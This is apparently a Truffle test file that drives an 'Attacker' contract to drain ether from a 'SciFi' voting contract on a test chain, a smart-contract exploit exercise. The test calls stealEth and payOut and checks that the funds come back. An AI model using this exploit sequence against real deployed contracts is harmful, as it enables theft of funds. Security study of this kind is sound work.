var SciFi = artifacts.require("./SciFi.sol")
var Attacker = artifacts.require("./Attacker.sol")
contract('Attacker', (accounts) => {

  describe('Steal some Moulah/Cheese/Ether', function() {
    it("...should steal all the ether from the SciFi contract.", () => {

      // Declaring this for later so we can chain functions on Attacker and SciFi
      let AttackerInstance
      let SciFiInstance

      // Set the initial balance
      let initialBalance = web3.eth.getBalance(accounts[0])
      console.log(initialBalance)

      const doAttack = () => {
        return AttackerInstance.fundMe(
          {from: accounts[0], gas:200000, value: web3.toWei(5,'ether')})
          .then(() => {
            return AttackerInstance.setSciFiAddress(
              SciFiInstance.address,
              {from: accounts[0], gas:200000})
          })
          .then(() => {
             return AttackerInstance.vote(
               web3.toHex('Coolmovie'),
               web3.toWei(5,'ether'),
               {from: accounts[0], gas:200000})
          })
          .then(() => {
            return AttackerInstance.stealEth({from: accounts[0], gas:400000})
          })
          .then(() => {
            return AttackerInstance.payOut({from: accounts[0], gas:200000})
          })
      }

      // Get accounts.
      return SciFi.deployed().then((instance) => {
        SciFiInstance = instance
        return Attacker.deployed().then((instance) => {
          AttackerInstance = instance
          return SciFiInstance.vote(
            web3.toHex('XYZ'),
            {from: accounts[1], gas:200000, value: web3.toWei(5,'ether')
          })
          .then((result) => {
            return doAttack()
          })
          .then(() =>{
            let currBalance = web3.eth.getBalance(accounts[0]);
            console.log(currBalance)
            // this represents 0.6 Eth if we compare it to the first part of the
            // bignumber (c[0]) which is the most reasonable comparison I could
            // think of for now but there might be a better way :)
            // also this is a lot of gas, so everything shoud be more efficient..
            let maxGas = 6000
            return assert.isAtMost(
              initialBalance.c[0],
              currBalance.c[0] + maxGas,
              "Got ethereum back minus some transaction cost.");

          })
        })
      })
    })


  })
})
